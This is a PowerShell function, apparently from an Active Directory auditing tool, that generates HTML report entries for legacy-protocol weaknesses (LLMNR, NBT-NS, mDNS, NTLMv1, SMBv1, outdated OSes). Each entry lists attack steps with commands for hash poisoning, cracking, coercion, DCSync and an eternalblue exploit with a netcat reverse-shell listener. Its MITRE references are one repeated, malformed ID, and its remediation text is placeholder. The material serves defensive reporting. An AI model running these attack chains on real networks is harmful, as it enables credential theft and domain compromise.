function Generate-Legacyhtml {  
    param (
        [array]$Legacy
    )

    if (!$Legacy) {
        $html = @"
        <div class="finding-header">Legacy</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }
    else {
        $html = @"
        <div class="finding-header">Legacy</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $Legacy) {
            if ($finding.Technique -eq "LLMNR is not disabled") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
        <tr>
            <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
            <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>An unauthenticated attacker can steal password hashes as LLMNR is vulnerable to layer 2 poisoning attacks.</td>
                                <td>T-15940</td>
                                <td>+$($finding.Score)</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Registry Key</td><td>$($finding.RegistryKey)</td></tr>
                                    <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>LLMNR is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with NBT-NS and mDNS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                    <p>LLMNR is not disabled by $domain by GPO as $($finding.RegistryKey) is not set to $($finding.CorrectValue).</p> 
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                    <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. An attacker listening on the local LAN with responder can respond to the LLMNR query and intercept the NTLMv2 password hash of the user.</p>
                                            <p class="code">sudo responder -I eth0</p>            
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                            <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Disable LLMNR</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>
"@  
            }
            elseif ($finding.Technique -eq "NBT-NS is not disabled") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>An unauthenticated attacker can steal password hashes as NBT-NS is vulnerable to layer 2 poisoning attacks.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Registry Key</td><td>$($finding.RegistryKey)</td></tr>
                                            <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Like LLMNR, NBT-NS is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with LLMNR and mDNS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                            <p>NBT-NS is not disabled by $domain by GPO as $($finding.RegistryKey) is not set to $($finding.CorrectValue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an NBT-NS query to attempt to resolve the hostname on the local LAN.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An attacker listening on the local LAN with responder can respond to the NBT-NS query and intercept the NTLMv2 password hash of the user.</p>
                                                    <p class="code">sudo responder -I eth0</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                                    <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable NBT-NS</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "mDNS is not disabled") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>An unauthenticated attacker can steal password hashes as mDNS is vulnerable to layer 2 poisoning attacks.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Registry Key</td><td>$($finding.RegistryKey)</td></tr>
                                            <tr><td class="grey">Correctly set</td><td>False</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Like LLMNR and NBT-NS, mDNS is a legacy fallback name resolution protocol that is vulnerable to layer 2 poisoning attacks. It is enabled by default in Active Directory networks in conjuction with LLMNR and NBT-NS. When a DNS query fails in Windows, the host broadcasts an LLMNR/NBT-NS/mDNS request at layer 2 on the local network to see if any other host can answer to resolve the hostname. However, as anyone can respond to an LLMNR request, an attacker listening on the network can respond to an LLMNR query and force the host to authenticate to the attacking machine, intercepting NTLMv2 password hashes. The hashes can be taken offline and cracked or relayed against systems with SMB signing disabled to gain administrative privileges within the network.</p>
                                            <p>mDNS is not disabled by $domain by GPO as $($finding.RegistryKey) is not set to $($finding.CorrectValue).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/what-is-llmnr-poisoning-and-how-to-avoid-it/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A unknowing user may fail a DNS request by mispelling a file share, which will invoke an mDNS query to attempt to resolve the hostname on the local LAN.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-1.png" alt="Failing a DNS request">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An attacker listening on the local LAN with responder can respond to the mDNS query and intercept the NTLMv2 password hash of the user.</p>
                                                    <p class="code">sudo responder -I eth0</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-2.png" alt="Retrieving the password hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or it can be bruteforced using a powerful GPU allowing an attacker to retrieve the user's plaintext credentials.</p>
                                                    <p class="code">john -w=./wordlist.txt hash.txt</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/LLMNR-3.png" alt="Cracking the password hash">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable mDNS</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "NTLMv1 is not disabled") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via an NTLMv1 authentication.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">LMCompatibilityLevel</td><td>$($finding.LMCompatibilityLevel)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>NTLMv1 is a legacy authentication protocol from 1993 that is rarely needed anymore, yet a surprising number of organizations still have it enabled despite it being cryptographically broken. Through RPC calls any authenticated domain user can coerce an authentication call back from the domain controller, negotiating NTLMv1 authentication rather than the more secure NTLMv2 or Kerberos v5. With the NTLMv1 password hash of the domain controller, due to cryptographic flaws this can be downgraded into the NTLM hash which is sufficient to impersonate the identity of a domain controller and thus fully compromise the domain. by performing a DCSync.</p>
                                            <p>The LAN Manager Authentication level is not set to disable NTLMv1 in either the Default Domain Controllers Policy or the Default Domain Policy.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://trustedsec.com/blog/practical-attacks-against-ntlmv1">Link 1</a></p>
                                            <p><a href="https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can by default coerce machine authentication using RPC from the domain controller (192.168.10.141) to an attacker controlled machine (192.168.10.130) with printerbug.</p>
                                                    <p class="code">python3 printerbug.py jack:'Password123!'@192.168.10.141 192.168.10.130 </p> 
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-1.png" alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An attacker can negotiate an NTLMv1 connection with the domain controller with responder and retrieve an NTLMv1 password hash of the domain controller.</p>
                                                    <p class="code">sudo responder -I eth0 --lm</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-2.png" alt="Retrieving the NTLMv1 password hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. As NTLMv1 is cryptographically broken the hash can be downgraded by submitting a converted hash to https://crack.sh/, which will return the NTLM hash of the domain controller.</p>
                                                    <p class="code">python3 ntlmv1.py --ntlmv1 <DC hash></p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-3.png" alt="Cracking the NTLMv1 hash">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. The ntlm hash can then be used to replicate the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes :89aca08404383706e09c9861dfee797e</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/NTLMv1-4.png" alt="Performing a DCSync">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable NTLMv1</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "SMBv1 is not disabled on computers") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>An unauthenticated attacker can remotely take control of a computer via SMBv1.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Computers</td><td>$($finding.SMBv1Computers -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">SMBv1</td><td>Enabled</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>SMBv1 is accepted on domain controllers. SMBv1 is a legacy file sharing protocol that is over 30 years old and is associated with the WannaCry ransomware that affected the NHS in 2017. SMBv1 was deprecated in 2013 and is no longer installed by default on Windows Server 2016. Significant vulnerabilities exist within SMBv1 which allow for denial of service and remote code execution on the target host.</p>
                                            <p>SMBv1 is enabled on $($finding.Count) Computers. Any computer running SMBv1 is at risk of an unauthenticated attacker remotely taking administrative control of the device.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://blog.netwrix.com/2021/11/30/what-is-smbv1-and-why-you-should-disable-it/">Link 1</a></p>
                                            <p><a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0148/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any unauthenticated user with network access can find devices where SMBv1 is enabled.</p>
                                                    <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p> 
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An unauthenticated attacker with network access can remotely exploit SMBv1 using ms17-010 (eternalblue).</p>
                                                    <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. Exploits effecting SMBv1 will return a remote command prompt with elevated privileges, fully compromising the target device.</p>
                                                    <p class="code">nc -lvnp 443</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable SMBv1</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Outdated") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>An unauthenticated attacker can remotely compromise a computer via outdated operating systems.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Operating Systems</td><td>$($finding.OperatingSystems -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">Number of outdated systems</td><td>$($finding.count)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Legacy systems often run business-critical software that cannot be upgraded, however contain critical CVEs facilitating remote code execution and denial of service largely due to vulnerabilities in SMBv1.</p>
                                            <p>There are $($finding.Count) legacy unsupported operating systems within the domain. All of these computers can be remotely taken over by attackers. If as a mitigating control the legacy OS is disabled in AD the risk is lower as although the system can be compromised, it cant be used for lateral movement.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://blog.netwrix.com/2021/11/30/what-is-smbv1-and-why-you-should-disable-it/">Link 1</a></p>
                                            <p><a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0148/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any unauthenticated user with network access can find outdated devices which will have SMBv1 enabled.</p>
                                                    <p class="code">nmap -p 445 10.11.175 -T4 -Pn -script vuln</p> 
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-1.png" alt="Finding SMBv1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An unauthenticated attacker with network access can remotely exploit the unsupported OS running SMBv1 using ms17-010 (eternalblue).</p>
                                                    <p class="code">python send_and_execute.py 10.11.1.5 ms17-010.exe</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-2.png" alt="Exploiting SMBv1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. Exploits effecting SMBv1 will return a remote command prompt with elevated privileges, fully compromising the legacy device.</p>
                                                    <p class="code">nc -lvnp 443</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Legacy/SMBv1-3.png" alt="Retrieving a command shell">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Disable SMBv1</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
        }
        $html += "</tbody></table></div>"
    }
    return $html
}